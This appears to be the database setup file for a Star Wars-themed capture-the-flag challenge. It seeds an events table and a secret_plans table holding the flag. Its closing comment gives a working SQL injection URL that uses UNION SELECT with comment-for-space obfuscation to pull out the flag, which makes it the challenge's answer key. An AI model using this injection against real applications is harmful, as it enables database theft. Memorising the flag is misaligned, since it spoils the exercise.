USE silicon;

CREATE TABLE events (
event_name char(64) NOT NULL,
event_desc char(128) NOT NULL,
event_date int(11)
);

CREATE TABLE secret_plans (
id int,
flag char(128)
);


INSERT INTO events VALUES ('Welcome Seminar','Stormtrooper Orientation for new Recruits',1626800400);
INSERT INTO events VALUES ('Meet and Greet','Meet your Sith Overlords!',1626804000);
INSERT INTO events VALUES ('Target Practice','Please show up this time!',1626811200);
INSERT INTO events VALUES ('Happy Hour','Time to socialize! Keep your helemts on...',1626825600);

INSERT INTO secret_plans VALUES (1,'silicon{Once_This_Group_Of_Stormtroopers_Is_Trained_we_target_Hoth}');

-- http://localhost:8234/event_details?event=Orientation%27/**/union/**/select/**/flag,null/**/from/**/secret_plans/**/where/**/%27a%27=%27a

